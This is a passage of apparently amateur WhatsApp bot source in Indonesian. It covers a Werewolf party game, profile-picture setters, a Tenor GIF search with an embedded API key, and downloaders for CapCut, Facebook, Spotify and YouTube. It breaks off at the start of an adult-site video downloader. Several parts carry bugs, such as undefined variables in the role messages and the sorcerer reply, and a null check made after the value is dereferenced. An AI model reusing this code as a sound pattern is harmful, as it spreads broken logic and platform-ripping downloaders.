                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return sycreply("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
            return sycreply("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return sycreply("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return sycreply("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(sych, chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(sych, chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_pagi(sych, chat, ww);
            }
        }
        if (ww[chat].status === true)
            return sycreply("Sesi permainan telah dimulai");
        if (ww[chat].owner !== sender)
            return sycreply(
                `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hai ${sych.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Kill Player ${ww[chat].player[p].number}`,
                        rowId: `.wwpc kill ${ww[chat].player[p].number}`,
                        description: `Untuk membunuh player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await sych.sendMessage(ww[chat].player[i].id, listMessage);
                   
                    await sych.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }

                // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${sych.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                    await sych.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hai ${sych.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;
                    
                     let row = [];
                     for (let p = 0; p < ww[chat].player.length; p++) {
                       row.push({
                         title: `Cek Player ${ww[chat].player[p].number}`,
                         rowId: `.ww dreamy ${ww[chat].player[p].number}`,
                         description: `Untuk melihat identitas player ${ww[chat].player[p].number}`,
                       });
                     }
                     const sections = [
                       { title: "⌂ W E R E W O L F - G A M E", rows: row },
                     ];
                     const listMessage = {
                       text: text,
                       footer: `Player Hidup: ${playerHidup(
                         sesi(m.chat, ww)
                       )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                       title: "⌂ W E R E W O L F - G A M E\n",
                       buttonText: "Clik here!",
                       sections,
                       mentions: player,
                     };
                     await sych.sendMessage(ww[chat].player[i].id, listMessage);
                     
                    await sych.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hai ${sych.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Lindungi Player ${ww[chat].player[p].number}`,
                        rowId: `.ww deff ${ww[chat].player[p].number}`,
                        description: `Untuk melindungi player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await sych.sendMessage(ww[chat].player[i].id, listMessage);
                    
                    await sych.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hai ${sych.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Cek Player ${ww[chat].player[p].number}`,
                        rowId: `.ww sorcerer ${ww[chat].player[p].number}`,
                        description: `Untuk melihat identitas player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await sych.sendMessage(ww[chat].player[i].id, listMessage);
                    
                    await sych.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await sych.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: "",
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(sych, chat, ww);
    } else if (value === "vote") {
        if (!ww[chat]) return sycreply("Belum ada sesi permainan");
        if (ww[chat].status === false)
            return sycreply("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
            return sycreply("Sesi voting belum dimulai");
        if (playerOnRoom(sender, chat, ww) === false)
            return sycreply("Kamu bukan player");
        if (dataPlayer(sender, ww).isdead === true)
            return sycreply("Kamu sudah mati");
        if (!target || target.length < 1)
            return sycreply("Masukan nomor player");
        if (isNaN(target)) return sycreply("Gunakan hanya nomor");
        if (dataPlayer(sender, ww).isvote === true)
            return sycreply("Kamu sudah melakukan voting");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return sycreply(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
            return sycreply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return sycreply("Player tidak terdaftar!");
        vote(chat, parseInt(target), sender, ww);
        return sycreply("✅ Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return sycreply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return sycreply("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
            return sycreply("Permainan sudah dimulai, kamu tidak bisa keluar");
        sycreply(`@${sender.split("@")[0]} Keluar dari permainan`, {
            withTag: true,
        });
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return sycreply("Tidak ada sesi permainan");
        if (ww[chat].owner !== sender)
            return sycreply(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
            );
        sycreply("Sesi permainan berhasil dihapus").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return sycreply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return sycreply("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
            return sycreply("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        sych.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
        sych.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
break
//==================================================================
case 'wwpc': {
let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require('./lib/werewolf.js')

    const {
        sender,
        chat
    } = m;
    sych.werewolf = sych.werewolf ? sych.werewolf : {};
    const ww = sych.werewolf ? sych.werewolf : {};
    const value = args[0];
    const target = args[1];

    if (playerOnGame(sender, ww) === false)
        return sycreply("Kamu tidak dalam sesi game");
    if (dataPlayer(sender, ww).status === true)
        return sycreply(
            "Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam"
        );
    if (dataPlayer(sender, ww).isdead === true)
        return sycreply("Kamu sudah mati");
    if (!target || target.length < 1) return sycreply("Masukan nomor player");
    if (isNaN(target)) return sycreply("Gunakan hanya nomor");
    let byId = getPlayerById2(sender, parseInt(target), ww);
    if (byId.db.isdead === true) return sycreply("Player sudah mati");
    if (byId.db.id === sender)
        return sycreply("Tidak bisa menggunakan skill untuk diri sendiri");
    if (byId === false) return sycreply("Player tidak terdaftar");
    if (value === "kill") {
        if (dataPlayer(sender, ww).role !== "werewolf")
            return sycreply("Peran ini bukan untuk kamu");
        if (byId.db.role === "sorcerer")
            return sycreply("Tidak bisa menggunakan skill untuk teman");
        return m
            .reply("Berhasil membunuh player " + parseInt(target))
            .then(() => {
                dataPlayer(sender, ww).status = true;
                killWerewolf(sender, parseInt(target), ww);
            });
    } else if (value === "dreamy") {
        if (dataPlayer(sender, ww).role !== "seer")
            return sycreply("Peran ini bukan untuk kamu");
        let dreamy = dreamySeer(m.sender, parseInt(target), ww);
        return m
            .reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    } else if (value === "deff") {
        if (dataPlayer(sender, ww).role !== "guardian")
            return sycreply("Peran ini bukan untuk kamu");
        return sycreply(`Berhasil melindungi player ${target}`)
        .then(() => {
            protectGuardian(m.sender, parseInt(target), ww);
            dataPlayer(sender, ww).status = true;
        });
    } else if (value === "sorcerer") {
        if (dataPlayer(sender, ww).role !== "sorcerer")
            return sycreply("Peran ini bukan untuk kamu");
        let sorker = sorcerer(sesi(m.sender), target);
        return m
            .reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    }
}
break
//==================================================================
case 'setpppanjang': {
     
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await sych.downloadAndSaveMediaMessage(quoted)
			let botNumber = await sych.decodeJid(sych.user.id)
			let { img } = await pepe(media)
			await sych.query({
				tag: 'iq',
				attrs: {
					to: botNumber,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`Sukses mengganti PP Bot`)
		} catch (e) {
			console.log(e)
			reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
	} else {
		reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
	}
}
break
//==================================================================
case 'setpppgcanjang': {
     
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await sych.downloadAndSaveMediaMessage(quoted)
			let { img } = await pepe(media)
			await sych.query({
				tag: 'iq',
				attrs: {
					to: m.chat,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`Admin @${(m.sender || '').replace(/@s\.whatsapp\.net/g, '')} telah mengganti Icon Group!`, null, { mentions: [m.sender] })
		} catch (e) {
			console.log(e)
			reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
	} else {
		reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
	}
}
break
//=========================================\\
case 'tenor': {
     
function isValidURL(message) {
    const urlPattern = /https?:\/\/[^\s/$.?#].[^\s]*/;
    return urlPattern.test(message);
}

async function getTemplateImageUrl(input, number) {
    try {
        const data = await (await fetch(`https://g.tenor.com/v1/search?q=${input}&key=LIVDSRZULELA`)).json();
        const selectedId = data.results[number - 1];
        return {
            one: selectedId,
            all: data.results
        };
    } catch (error) {
        console.error("Error fetching data:", error);
        return "Error fetching data.";
    }
}
    let [tema, urutan] = text.split(/[^\w\s]/g)
    if (!tema) return sycreply("*Example:*\n.tenor [tema]|[angka]")
    if (!urutan) return sycreply("*Example:*\n.tenor [tema]|[angka]")
    if (isNaN(urutan)) return sycreply("*Example:*\n.tenor [tema]|[angka]")
    await sycreplyTan(`Sedang Proses Permintaan...`)
    try {
        let json = await getTemplateImageUrl(tema, urutan)
        let data = json.one
        let all = json.all
        if (urutan > all.length) return sycreply("Input query!\n*Example:*\n.tenor [tema]|[angka]\n\n*Pilih angka yg ada*\n" + all.map((item, index) => `*${index + 1}.* ${item.content_description}`).join("\n"))
        if (isValidURL(data.media[0].mp4.url)) {
            let caption = `🔍 *[ HASIL ]*

🆔 *ID:* ${data.id}
🌐 *URL:* ${data.url}
📋 *Description:* ${data.content_description}
📌 *Item:* ${data.itemurl}`
            await sych.sendMessage(m.chat, {
                video: {
                    url: data.media[0].mp4.url
                },
                caption: caption,
                gifPlayback: true,
                gifAttribution: 2
            }, {
                quoted: m
            })
        }
    } catch (e) {
        await sycreply(eror)
    }
}
break



//capcut

case 'capcut': {
     
    if (!text) {
        await sych.sendMessage(m.chat, { text: `Contoh: ${prefix + command} https://www.capcut.com/videoId` }, { quoted: fkontak });
        break;
    }
    if (!text.includes('capcut')) {
        await sych.sendMessage(m.chat, { text: 'Link yang kamu masukkan bukan link CapCut! 😅' }, { quoted: m });
        break;
    }

    try {
        await sych.sendMessage(m.chat, { text: '⏱️ Sedang memproses video CapCut...' }, { quoted: fkontak });

        // Fetch API CapCut
        const response = await fetch(`https://api.siputzx.my.id/api/d/capcut?url=${text}`);
        const data = await response.json();

        if (!data.status || !data.data?.originalVideoUrl) {
            await sych.sendMessage(m.chat, { text: 'Gagal mendapatkan video. Coba lagi nanti!' }, { quoted: fkontak });
            break;
        }

        const { title, description, originalVideoUrl, coverUrl } = data.data;

        // Kirim pesan video
        await sych.sendMessage(m.chat, {
            video: { url: originalVideoUrl },
            mimetype: 'video/mp4',
            caption: `✅ *Video berhasil diunduh!*\n\n*Judul:* ${title}\n*Deskripsi:* ${description}`
        }, { quoted: fkontak });

        // Kirim thumbnail sebagai informasi tambahan
        await sych.sendMessage(m.chat, {
            image: { url: coverUrl },
            caption: '📸 *Thumbnail Video CapCut*'
        }, { quoted: fkontak });

    } catch (err) {
        console.error(err);
        await sych.sendMessage(m.chat, {
            text: `*Terjadi kesalahan!* 😭\n${err.message || err}`
        }, { quoted: fkontak });
    }
    break;
}

//facebook
case 'facebook': {
     
    if (!text) {
        await sych.sendMessage(m.chat, { 
            text: `Contoh penggunaan:\n${prefix + command} https://www.facebook.com/share/r/12BFZAtjpS8/?mibextid=qDwCgo` 
        }, { quoted: fkontak });
        break;
    }

    if (!text.includes('facebook.com') && !text.includes('fb.watch')) {
        await sych.sendMessage(m.chat, { 
            text: 'Link yang kamu masukkan bukan link Facebook! 😅' 
        }, { quoted: fkontak });
        break;
    }

    try {
        await sych.sendMessage(m.chat, { 
            text: '⏳ Sedang memproses video...' 
        }, { quoted: fkontak });

        // Panggil API
        const response = await fetch(`https://api.siputzx.my.id/api/d/facebook?url=${encodeURIComponent(text)}`);
        const result = await response.json();

        if (!result.status || !result.data?.video) {
            await sych.sendMessage(m.chat, { 
                text: 'Gagal mendapatkan video. Coba lagi nanti!' 
            }, { quoted: fkontak });
            break;
        }

        const videoUrl = result.data.video; // URL video
        const thumbnailUrl = result.data.thumbnail; // Thumbnail video
        const userInfo = result.data.userInfo; // Info pengguna

        // Periksa apakah video dan thumbnail valid
        if (!videoUrl || !thumbnailUrl) {
            await sych.sendMessage(m.chat, { 
                text: 'Data video atau thumbnail tidak valid!' 
            }, { quoted: fkontak });
            break;
        }

        // Mendapatkan buffer video dan thumbnail
        const videoBuffer = await fetch(videoUrl).then(res => res.buffer());
        const thumbnailBuffer = await fetch(thumbnailUrl).then(res => res.buffer());

        const base64Video = videoBuffer.toString('base64');
        const base64Thumbnail = thumbnailBuffer.toString('base64');

        // Kirim video ke chat
        await sych.sendMessage(m.chat, {
            video: { url: videoUrl },  // URL video tetap
            mimetype: 'video/mp4',     // Pastikan mimetype sesuai dengan jenis file video
            caption: `✅ *Video berhasil diunduh!*\n\n👤 *Pengguna:* ${userInfo.name}\n🔗 *Sumber:* [Tautan Video](${text})`,
            jpegThumbnail: base64Thumbnail // Kirim thumbnail sebagai Base64
        }, { quoted: fkontak });

    } catch (err) {
        console.error(err);
        await sych.sendMessage(m.chat, {
            text: `*Terjadi kesalahan!* 😭\n${err.message || err}`
        }, { quoted: fkontak });
    }
    break;
}

//spotify
case 'spo': {
     
    if (!text) {
        await sych.sendMessage(m.chat, { 
            text: `Contoh penggunaan:\n${prefix + command} https://open.spotify.com/track/4cPqgJcFAwA0v6dQk3DlMc` 
        }, { quoted: fkontak });
        break;
    }

    if (!text.includes('spotify.com')) {
        await sych.sendMessage(m.chat, { 
            text: 'Link yang kamu masukkan bukan link Spotify! 😅' 
        }, { quoted: fkontak });
        break;
    }

    try {
        await sych.sendMessage(m.chat, { 
            text: '⏳ Sedang memproses lagu atau playlist...' 
        }, { quoted: fkontak });

        const response = await fetch(`https://api.siputzx.my.id/api/d/spotify?url=${encodeURIComponent(text)}`);
        
        if (!response.ok) {
            throw new Error(`API Error: ${response.status} ${response.statusText}`);
        }

        const result = await response.json();
        console.log('Respons API:', JSON.stringify(result, null, 2));

        if (!result.status || !result.metadata || !result.download) {
            console.log('Data tidak valid:', result);
            await sych.sendMessage(m.chat, { 
                text: 'Gagal mendapatkan data lagu atau playlist. Coba lagi nanti!' 
            }, { quoted: fkontak });
            break;
        }

        // Mendapatkan data dari respons
        const trackUrl = result.download; // URL unduhan audio
        const thumbnailUrl = result.metadata.cover_url; // URL cover album
        const artistName = result.metadata.artist; // Nama artis
        const trackName = result.metadata.name; // Nama lagu

        // Path sementara untuk file audio
        const outputPath = './downloads/compressed_audio.mp3';

        // Kompres file audio menggunakan ffmpeg
        ffmpeg(trackUrl)
    .audioBitrate(128)
    .toFormat('mp3')
    .outputOptions('-preset ultrafast')
    .on('end', async () => {
        console.log('Audio berhasil dikompres.');

        const fs = require('fs');
        if (!fs.existsSync(outputPath)) {
            console.error('File audio yang dikompresi tidak ditemukan.');
            await sych.sendMessage(m.chat, { 
                text: '⚠️ Gagal menemukan file audio setelah kompresi. Coba lagi.' 
            }, { quoted: fkontak });
            return;
        }

        console.log('Mengirim audio ke WhatsApp...');
        try {
            const audioBuffer = fs.readFileSync(outputPath);
            await sych.sendMessage(m.chat, {
                audio: audioBuffer,
                mimetype: 'audio/mpeg',
                
                ptt: true,  // Menggunakan PTT (Push to Talk)
                caption: `✅ *Lagu berhasil diunduh dan dikompres!*`,
                        
            }, { quoted: fkontak });
            console.log('Audio berhasil dikirim.');
        } catch (sendError) {
            console.error('Gagal mengirim audio:', sendError);
            await sych.sendMessage(m.chat, {
                text: '⚠️ Gagal mengirim file audio. Coba lagi nanti.'
            }, { quoted: fkontak });
        }

        // Hapus file setelah selesai
        fs.unlinkSync(outputPath);
    })
    .on('error', (err) => {
        console.error('Error selama proses kompresi:', err);
        sych.sendMessage(m.chat, { 
            text: '⚠️ Terjadi kesalahan saat mengompres audio. Coba lagi nanti.' 
        }, { quoted: fkontak });
    })
    .save(outputPath);
    } catch (err) {
        console.error(err);
        await sych.sendMessage(m.chat, {
            text: `*Terjadi kesalahan!* 😭\n${err.message || err}`
        }, { quoted: fkontak });
    }
    break;
}

//image google
case 'gooimage': {
     
    if (!text) {
        await sych.sendMessage(m.chat, { 
            text: `Contoh penggunaan:\n${prefix + command} siputzx` 
        }, { quoted: fkontak });
        break;
    }

    try {
        // Mengirimkan pesan bahwa pencarian sedang diproses
        await sych.sendMessage(m.chat, { 
            text: '🔍 Sedang mencari gambar...' 
        }, { quoted: fkontak });

        // Mengirim permintaan ke API
        const response = await fetch(`https://api.siputzx.my.id/api/images?query=${encodeURIComponent(text)}`);
        
        if (!response.ok) {
            throw new Error(`API Error: ${response.status} ${response.statusText}`);
        }

        const result = await response.json();
        console.log('Respons API:', JSON.stringify(result, null, 2));

        // Menyaring data yang ditemukan
        if (result.status && result.data.length > 0) {
            // Ambil URL gambar pertama dari hasil pencarian
            const imageUrl = result.data[0].url; // Sesuaikan dengan format respons API jika diperlukan

            // Kirimkan gambar ke WhatsApp
            await sych.sendMessage(m.chat, {
                image: { url: imageUrl },
                caption: `🔍 Hasil pencarian untuk: ${text}`
            }, { quoted: fkontak });
        } else {
            await sych.sendMessage(m.chat, {
                text: `Gambar tidak ditemukan untuk kata kunci *${text}*.\nCoba dengan kata kunci lain atau lebih spesifik.`
            }, { quoted: fkontak });
        }
    } catch (err) {
        console.error(err);
        await sych.sendMessage(m.chat, {
            text: `*Terjadi kesalahan!* 😭\n${err.message || err}`
        }, { quoted: fkontak });
    }
    break;
}


			case 'play3': {
			     
    if (!text) return sycreply(`*< / >* Example: ${prefix + command} dj komang`);
    sycreply(mess.wait);

    const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];
    for (const emoji of reactEmojis) {
        await sych.sendMessage(m.chat, {
            react: {
                text: emoji,
                key: m.key
            }
        });
    }

try {
    const res = await yts.search(text);
    const hasil = res.all[0];
    if (!hasil || !hasil.url) {
        return sycreply('Tidak ada hasil yang ditemukan!');
    }
    console.log('Hasil pencarian:', hasil);
    
        const teksnya = `*📍Title:* ${hasil.title || 'Tidak tersedia'}\n*✏Description:* ${hasil.description || 'Tidak tersedia'}\n*🌟Channel:* ${hasil.author?.name || 'Tidak tersedia'}\n*⏳Duration:* ${hasil.seconds || 'Tidak tersedia'} second (${hasil.timestamp || 'Tidak tersedia'})\n*🔎Source:* ${hasil.url || 'Tidak tersedia'}`;
        await sych.sendMessage(m.chat, {
            image: { url: hasil.thumbnail },
            caption: teksnya
        }, { quoted: m });

        const url = hasil.url;
        sycreply('Bentar mengunduh lagu..');

        // Cek durasi video
        const info = await ytdl.getInfo(url);
        if (info.videoDetails.lengthSeconds > 360) {
            return sycreply('Video terlalu panjang. Silakan coba video dengan durasi lebih pendek.');
        }

        const title = info.videoDetails.title.replace(/[<>:"/\\|?*]/g, '');
        const outputPath = path.join('./downloads', `${title}.mp3`);
        const compressedPath = path.join('./downloads', `${title}_compressed.mp3`);
        if (!fs.existsSync('./downloads')) {
            fs.mkdirSync('./downloads', { recursive: true });
        }

        console.log('Mulai mengunduh audio...');
        const timeoutPromise = new Promise((_, reject) =>
            setTimeout(() => reject(new Error('Timeout: Proses unduhan terlalu lama!')), 80000)
        );

        await Promise.race([
            new Promise((resolve, reject) => {
                const audioStream = ytdl(url, { filter: 'audioonly', quality: 'lowestaudio' });
                const tempFile = fs.createWriteStream(outputPath);
                audioStream.pipe(tempFile);

                audioStream.on('progress', (chunkLength, downloaded, total) => {
                    console.log(`Mengunduh: ${((downloaded / total) * 100).toFixed(2)}%`);
                });

                audioStream.on('end', resolve);
                tempFile.on('finish', resolve);
                tempFile.on('error', (err) => reject(err));
            }),
            timeoutPromise
        ]);

        console.log('Mengunduh selesai, mulai mengompresi...');
        ffmpeg(outputPath)
            .audioBitrate(128)
            .outputOptions('-preset ultrafast')
            .on('end', async () => {
                await sych.sendMessage(m.chat, {
                    audio: { url: compressedPath },
                    mimetype: 'audio/mpeg',
                    contextInfo: {
                        externalAdReply: {
                            title: title,
                            body: 'Klik untuk melihat sumber',
                            thumbnailUrl: hasil.thumbnail,
                            sourceUrl: url
                        }
                    }
                }, { quoted: m });

                fs.unlinkSync(outputPath);
                fs.unlinkSync(compressedPath);
                console.log('Selesai mengirim audio.');
            })
            .on('error', (err) => {
                console.error('Error saat mengompresi audio:', err);
                sycreply('Terjadi kesalahan saat mengompresi audio.');
            })
            .save(compressedPath);

    } catch (e) {
        console.error('Error:', e);
        sycreply('Gagal memproses permintaan!');
    }
}
break;

//xnxx download

case 'xnxxdl': {
    if (!isRegistered) {
        return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
    }

    if (!text) {
        await sych.sendMessage(m.chat, { 
            text: `Contoh penggunaan:\n${prefix + command} https://www.xnxx.com/video-141ewlbb/gojosotoru`
        }, { quoted: fkontak });
        break;
    }

    if (!text.includes('xnxx.com/video-')) {
        await sych.sendMessage(m.chat, { 
            text: 'Link yang kamu masukkan bukan link video xnxx! 😅' 
        }, { quoted: m });
        break;
    }

    try {
